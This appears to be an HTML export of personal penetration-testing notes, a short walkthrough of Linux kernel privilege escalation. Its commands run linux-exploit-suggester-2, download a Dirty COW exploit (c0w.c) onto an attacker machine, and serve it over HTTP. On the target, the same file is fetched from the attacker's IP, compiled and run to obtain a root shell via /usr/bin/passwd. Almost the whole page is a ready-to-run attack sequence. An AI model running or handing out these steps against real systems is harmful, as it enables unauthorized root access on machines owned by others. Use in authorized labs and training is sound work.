<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>compile and execute the exploit</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>compile and execute the exploit</h1><br/>1. Find the kernel exploit for example with <strong>linux-exploit-suggester-2</strong><br />    Attacker machine<br />    <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>jondonas<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2.pl<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># .<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2.pl -k &lt;kernel-number&gt;</pre></div><br />    <a href=""><img src="images/1284-1.png" alt="images/1284-1.png" /></a><br />    Once we have found an exploit we can search on internet(GitHub etc.) for the most appropriate code for our specific machine<br />    <br />2. this version of the exploit: <a href="https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54">https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54</a> seems can work better on our machine<br />    Attacker<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">cd</span> <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>gist.github.com<span style="color:#ff9d00;font-weight:700">/</span>KrE80r<span style="color:#ff9d00;font-weight:700">/</span>42f8629577db95782d5e4f609f437a54<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>71c902f55c09aa8ced351690e1e627363c231b45<span style="color:#ff9d00;font-weight:700">/</span>c0w.c<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 -m http.server 80 -d <span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html</pre></div><br />    Download on the target, Compile and Execute <br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">wget</span> http<span style="color:#ff9d00;font-weight:700">://</span>&lt;attackerIP&gt;<span style="color:#ff9d00;font-weight:700">/</span>c0w.c<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">gcc</span> -pthread c0w.c -o c0w        <span style="color:#0088ff;font-weight:400"># pthread adds support for multithreading with the pthreads library. </span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>c0w<br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/passwd</span>    <span style="color:#0088ff;font-weight:400">#execute /usr/bin/passwd binary to get a root shell</span></pre></div><br />    <a href=""><img src="images/1284-2.png" alt="images/1284-2.png" /></a><br /></div>
</body>
</html>
